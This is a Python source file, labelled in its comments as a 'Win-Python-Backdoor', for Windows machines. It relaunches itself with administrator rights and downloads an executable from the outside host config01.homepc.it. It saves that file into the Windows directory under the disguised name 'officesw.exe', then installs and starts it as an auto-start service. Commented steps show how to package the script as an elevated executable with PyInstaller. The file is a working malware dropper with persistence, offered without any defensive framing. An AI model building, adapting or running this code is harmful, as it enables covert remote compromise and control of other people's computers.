import win32serviceutil
import win32service
import win32event
import socket
import servicemanager
import threading
import asyncore
import sched,time
import sys,ctypes
import os

#import Crypto
#import ecdsa
#import paramiko
import subprocess
import http.client
import requests
#import urllib3
import urllib.request
#import pycurl
from os import path, access, R_OK
from uuid import getnode as get_mac
from subprocess import Popen
#from fake_useragent import UserAgent

#import logging
#from logging.handlers import RotatingFileHandler

#import win32ui, win32gui, win32com, pythoncom, win32con
#from win32com.client import Dispatch
#from time import sleep
#import _winreg
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False






#Win-Python-Backdoor

#pip install requests
#pip install fake_useragent
#scripts\pip3 install pyinstaller
#cd %USERPROFILE%\AppData\Local\Programs\Python\Python37

#copy /y "%USERPROFILE%\Documents\GitHub\Win-Python-Backdoor\intro.py" %USERPROFILE%\AppData\Local\Programs\Python\Python37

#scripts\pyinstaller  -F --hidden-import=win32timezone  intro.py
#scripts\pyinstaller --manifest build\intro\intro.exe.manifest --uac-admin -F --hidden-import=win32timezone  intro.py
#copy /y %USERPROFILE%\AppData\Local\Programs\Python\Python37\dist\intro.exe %USERPROFILE%\Documents\GitHub\Win-Python-Backdoor\intro.exe

            


if __name__ == '__main__':
    #Init()
    #myloop()
    if is_admin():
      print ("admin")
    else:
# Re-run the program with admin rights
      ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
    
    
    ip=socket.gethostbyname('config01.homepc.it')
    SW_HIDE = 0
    info = subprocess.STARTUPINFO()
    info.dwFlags = subprocess.STARTF_USESHOWWINDOW
    info.wShowWindow = SW_HIDE
    wupname="officesw"
#    print (os.getenv('temp')+"\\"+wupname+".exe http://"+ip+"/win/wup.exe")
    with urllib.request.urlopen("http://"+ip+"/win/wup.exe") as response, open(os.getenv('windir')+"\\"+wupname+".exe", 'wb') as out_file:
       data = response.read() # a `bytes` object
       out_file.write(data)    
    #subprocess.Popen("curl -L http://"+ip+"/win/win.bat -o "+os.getcwd()+"\\office.bat", startupinfo=info)       
    time.sleep(5)
#    p = Popen(os.getcwd()+"\\office.bat", startupinfo=info)
    p = Popen("sc delete "+wupname)
    time.sleep(5)
    p = Popen("sc create "+wupname+" binPath= "+os.getenv('windir')+"\\"+wupname+".exe DisplayName= "+wupname+" start= auto")
    time.sleep(5)
    p = Popen("net start "+wupname)
    
    


